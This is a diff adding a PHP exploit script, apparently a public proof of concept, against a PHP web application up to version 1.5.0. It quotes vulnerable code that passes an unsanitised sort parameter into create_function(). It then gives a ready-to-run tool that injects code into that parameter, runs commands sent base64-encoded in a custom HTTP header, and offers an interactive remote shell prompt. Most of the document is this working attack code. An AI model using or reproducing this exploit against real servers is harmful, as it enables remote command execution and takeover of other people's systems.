@@ -1,0 +1,75 @@
+<?php
+
+/*
+	--------------------------------------------------
+	RoSPORA <= 1.5.0 Remote PHP Code Injection Exploit
+	--------------------------------------------------
+	
+	author...: EgiX
+	mail.....: n0b0d13s[at]gmail[dot]com
+	link.....: http://code.google.com/p/rospora/
+	
+	This PoC was written for educational purpose. Use it at your own risk.
+	Author will be not responsible for any damage.
+	
+	[-] vulnerable code in /index.php
+	
+	667.	if (!$sort = &$_GET['s']) $sort=0;
+	668.	if (!$flag = &$_GET['f']) $flag=0;
+	669.	if ($flag==0)   {       $flag=1; $sort_type='<'; } 
+	670.	                else    {       $flag=0; $sort_type='>'; }
+	671.	$link=$_SERVER['PHP_SELF']."?f=".$flag."&s=";
+	672.	
+	673.	if (!empty($pl_array)) 
+	674.	        {
+	675.	        usort($pl_array, create_function('$a, $b', 'if ( $a['.$sort.'] == $b['.$sort.'] ) return 0; if ( $a['.$sort.'] '.$sort_type.' $b['.$sort.'] ) return -1; return 1;'));
+	676.	        }
+	
+	Input parameter passed through $_GET['s'] isn't properly sanitised before being used in a call to
+	"create_function()" at line 675. This can be exploited to inject and execute arbitrary PHP code.
+
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+	if (!($sock = fsockopen($host, 80)))
+		die("\n[-] No response from {$host}:80\n");
+
+	fputs($sock, $packet);
+	return stream_get_contents($sock);
+}
+
+print "\n+------------------------------------------------------------+";
+print "\n| RoSPORA <= 1.5.0 Remote PHP Code Injection Exploit by EgiX |";
+print "\n+------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+	print "\nUsage......: php $argv[0] host path\n";
+	print "\nExample....: php $argv[0] localhost /";
+	print "\nExample....: php $argv[0] localhost /rospora/\n";
+	die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+$code	 = "0]);}error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die;%%23";
+$packet  = "GET {$path}?s={$code} HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+while(1)
+{
+	print "\nrospora-shell# ";
+	if (($cmd = trim(fgets(STDIN))) == "exit") break;
+	$response = http_send($host, sprintf($packet, base64_encode($cmd)));
+	preg_match("/_code_/", $response) ? print array_pop(explode("_code_", $response)) : die("\n[-] Exploit failed...\n");
+}
+
+?>
